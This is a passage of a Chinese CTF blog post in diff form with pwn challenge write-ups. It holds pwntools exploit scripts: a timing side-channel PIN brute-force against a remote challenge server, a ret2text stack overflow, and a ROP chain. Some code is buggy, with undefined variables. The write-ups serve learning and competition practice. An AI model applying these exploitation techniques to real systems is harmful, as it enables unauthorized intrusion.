+    p.sendafter(a, b)
+def sl(a):
+    p.sendline(a)
+def sla(a, b):
+    p.sendlineafter(a, b)
+def r():
+    p.recv()
+def pr():
+    print(p.recv())
+def ru(a):
+    return p.recvuntil(a)
+def inter():
+    p.interactive()
+def debug():
+    gdb.attach(p)
+    pause()
+def get_addr():
+    return u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))
+def get_sb():
+    return libc_base + libc.sym[&#39;system&#39;], libc_base + next(libc.search(b&#39;/bin/sh\x00&#39;))
+
+
+def getpin(pin):
+    subtime = -1
+    res =&#39;&#39;
+    for c in a:
+        pin_o = pin+c+&#39;0&#39;*(7-len(pin))
+        sum=0
+        for _ in range(10):
+            ru(&#39;&gt;&#39;)
+            sl(b&#39;3&#39;)
+            ru(b&quot;PIN code: &quot;)
+            start=time.time()
+            sl(pin_o)
+            rev=ru(b&#39;\n&#39;)
+            if b&quot;Wrong PIN code&quot; in rev:
+                pass
+            else:
+                print(pin_0)
+                break
+            end=time.time()
+            sum+=(end-start)
+        print(cur,sum)
+        avgtime=sum
+        if(avgtime&gt;subtime):
+            subtime=avgtime
+            res=c
+    return res
+a=&#39;0123456789&#39;
+p= remote(&quot;123.56.238.150&quot;,45118)
+pin=&#39;&#39;
+for i in range(8):
+    pin+=getpin(pin)
+    print(&quot;PIN:&quot;,pin)
+ru(b&#39;&gt;&#39;)
+sl(b&#39;2&#39;)
+ru(b&#39;PASSWD&#39;)
+sl(b&quot;123456&quot;)
+ru(b&#39;$&#39;)
+sl(b&quot;cat flag&quot;)
+p.interactive()
+#flag&#123;d39a1013-e066-4d64-8558-4a5855fb7303&#125;   pin code : 54730891
+            
+</code></pre>
+<h3 id="【SSCTF】"><a href="#【SSCTF】" class="headerlink" title="【SSCTF】"></a>【SSCTF】</h3><p>pwn_stack<br>（1）checksec </p>
+<p>​      <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230604234931863.png" alt="image-20230604234931863"></p>
+<p>​       只开了NX好办捏😀<br>（2） 进IDA<br>   <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230604235352214.png" alt="image-20230604235352214"></p>
+<p>很明显的函数提示 先看看主函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230604235530821.png" alt="image-20230604235530821"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230604235541815.png" alt="image-20230604235541815"></p>
+<p>buf溢出但被打印出 可忽视（此处知识点较为模糊 还需进一步进行研究解读）v1处溢出<br>查看偏移位0x98 再回到shell函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230605000024030.png" alt="image-20230605000024030"></p>
+<p>没什么好说直接开整 典型ret2text<br>exp：</p>
+<pre><code class="python">from pwn import *
+p = process(&quot;./1&quot;)#太懒了给文件名改名了😜
+bin_sh = 0x0400831 
+sys_addr = 0x40083D
+
+#p.recvuntil(&quot;What&#39;s your name?&quot;)
+
+payload =b&#39;A&#39;* (0x90 + 8) + p64(bin_sh)  + p64(sys_addr)
+#p.recvuntil(&#39;\n&#39;)
+
+p.sendline(&#39;yub&#39;)
+p.recvuntil(&quot;How old are you?&quot;)
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>从函数头返回注意栈对齐问题 +1跳过push rbp的8字节对齐</p>
+<h3 id="【Black-Rop】"><a href="#【Black-Rop】" class="headerlink" title="【Black Rop】"></a>【Black Rop】</h3><p>（1）checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230629171541372.png" alt="image-20230629171541372"></p>
+<p>（2）IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230629171837565.png" alt="image-20230629171837565"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230629171906502.png" alt="image-20230629171906502"></p>
+<p>常规溢出捏~<br>系统没给出system和”&#x2F;bin&#x2F;sh” 所以构造rop</p>
+<pre><code class="python">from pwn import *
+
+p = process(&#39;./rop&#39;)
+ 
+pop4 = 0x080493e8 # pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+pop1 = 0x0804901e # pop ebx ; ret
+pop2 = 0x080493ea # pop edi ; pop ebp ; ret
+pop3 = 0x080493e9 # pop esi ; pop edi ; pop ebp ; ret
+
+ 
+payload = b&#39;A&#39;*0x12+ flat(0,0x80492ce,0x8049293, pop1, 0x804a033, 0x80492e8, pop1, 0xbae, 0x804930b, pop2, 0x62023 , 0xBF1212, 0x80491c2)
+p.sendlineafter(b&quot;check your identity and read the flag.\n&quot;, payload)
+p.recvline()
+p.interactive()
+</code></pre>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://yubut.github.io">yub</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://yubut.github.io/2023/09/01/Pwn%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/">https://yubut.github.io/2023/09/01/Pwn题目记录/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://yubut.github.io" target="_blank">幻境</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn-%E7%9F%A5%E8%AF%86%E7%A2%8E%E7%89%87/">pwn,知识碎片</a></div><div class="post_share"><div class="social-share" data-image="https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/e4f95a48e6c9c74312ac5ed6fcdc8a14.jpg?x-oss-process=image%2Fresize%2Cm_lfit%2Cw_960%2Ch_540" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%AF%87%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%AC%A6/" title="C的探索碎片——操作符"><img class="cover" src="https://img.tukuppt.com/bg_grid/00/04/53/G7edt37350.jpg!/fh/350" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">C的探索碎片——操作符</div></div></a></div><div class="next-post pull-right"><a href="/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/" title="pwn探索--大杂烩"><img class="cover" src="https://thumbs.dreamstime.com/b/%E5%8A%A8%E6%BC%AB%E8%83%8C%E6%99%AF%E5%A5%87%E5%B9%BB%E6%8F%92%E5%9B%BE%E6%B8%B8%E6%88%8F%E7%8E%AF%E5%A2%83%E7%AB%A5%E4%B9%A6%E4%BB%99%E5%A2%83%E6%99%AF%E8%A7%82%E6%8F%92%E5%9B%BE-270943592.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">pwn探索--大杂烩</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/" title="Canary解决姿势"><img class="cover" src="https://www.bizhizj.com/pc-img/2023-04/2146.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-01</div><div class="title">Canary解决姿势</div></div></a></div><div><a href="/2023/09/01/ret2csu/" title="ret2csu"><img class="cover" src="https://images.alphacoders.com/131/1311951.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-01</div><div class="title">ret2csu</div></div></a></div><div><a href="/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/" title="pwn探索--大杂烩"><img class="cover" src="https://thumbs.dreamstime.com/b/%E5%8A%A8%E6%BC%AB%E8%83%8C%E6%99%AF%E5%A5%87%E5%B9%BB%E6%8F%92%E5%9B%BE%E6%B8%B8%E6%88%8F%E7%8E%AF%E5%A2%83%E7%AB%A5%E4%B9%A6%E4%BB%99%E5%A2%83%E6%99%AF%E8%A7%82%E6%8F%92%E5%9B%BE-270943592.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-01</div><div class="title">pwn探索--大杂烩</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">yub</div><div class="author-info__description">路迟青</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/yubut" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://qm.qq.com/q/Le1ZeB0K40" target="_blank" title=""><i class="fab fa-qq"></i></a><a class="social-icon" href="mailto:3023536144@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwn%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">Pwn题目记录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%80%90NKCTF%E3%80%91"><span class="toc-number">2.</span> <span class="toc-text">【NKCTF】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-stack"><span class="toc-number">3.</span> <span class="toc-text">ez_stack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%80%902023CISCN%E3%80%91"><span class="toc-number">4.</span> <span class="toc-text">【2023CISCN】</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#shaokao"><span class="toc-number">4.1.</span> <span class="toc-text">shaokao</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E3%80%90funcannary%E3%80%91"><span class="toc-number">4.2.</span> <span class="toc-text">【funcannary】</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%80%90SSCTF%E3%80%91"><span class="toc-number">5.</span> <span class="toc-text">【SSCTF】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%80%90Black-Rop%E3%80%91"><span class="toc-number">6.</span> <span class="toc-text">【Black Rop】</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/" title="Canary解决姿势"><img src="https://www.bizhizj.com/pc-img/2023-04/2146.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Canary解决姿势"/></a><div class="content"><a class="title" href="/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/" title="Canary解决姿势">Canary解决姿势</a><time datetime="2023-08-31T16:00:00.000Z" title="发表于 2023-09-01 00:00:00">2023-09-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%89%87%E2%80%94%E2%80%94static%E7%9A%84%E4%BD%9C%E7%94%A8/" title="C探索碎片——关键字static作用"><img src="https://png.pngtree.com/thumb_back/fh260/back_our/20190622/ourmid/pngtree-blue-sky-free-illustration-image_221359.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="C探索碎片——关键字static作用"/></a><div class="content"><a class="title" href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%89%87%E2%80%94%E2%80%94static%E7%9A%84%E4%BD%9C%E7%94%A8/" title="C探索碎片——关键字static作用">C探索碎片——关键字static作用</a><time datetime="2023-08-31T16:00:00.000Z" title="发表于 2023-09-01 00:00:00">2023-09-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/01/ret2csu/" title="ret2csu"><img src="https://images.alphacoders.com/131/1311951.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ret2csu"/></a><div class="content"><a class="title" href="/2023/09/01/ret2csu/" title="ret2csu">ret2csu</a><time datetime="2023-08-31T16:00:00.000Z" title="发表于 2023-09-01 00:00:00">2023-09-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%AF%87%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%AC%A6/" title="C的探索碎片——操作符"><img src="https://img.tukuppt.com/bg_grid/00/04/53/G7edt37350.jpg!/fh/350" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="C的探索碎片——操作符"/></a><div class="content"><a class="title" href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%AF%87%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%AC%A6/" title="C的探索碎片——操作符">C的探索碎片——操作符</a><time datetime="2023-08-31T16:00:00.000Z" title="发表于 2023-09-01 00:00:00">2023-09-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/01/Pwn%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/" title="部分PWN题目记录"><img src="https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/e4f95a48e6c9c74312ac5ed6fcdc8a14.jpg?x-oss-process=image%2Fresize%2Cm_lfit%2Cw_960%2Ch_540" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="部分PWN题目记录"/></a><div class="content"><a class="title" href="/2023/09/01/Pwn%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/" title="部分PWN题目记录">部分PWN题目记录</a><time datetime="2023-08-31T16:00:00.000Z" title="发表于 2023-09-01 00:00:00">2023-09-01</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By yub</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
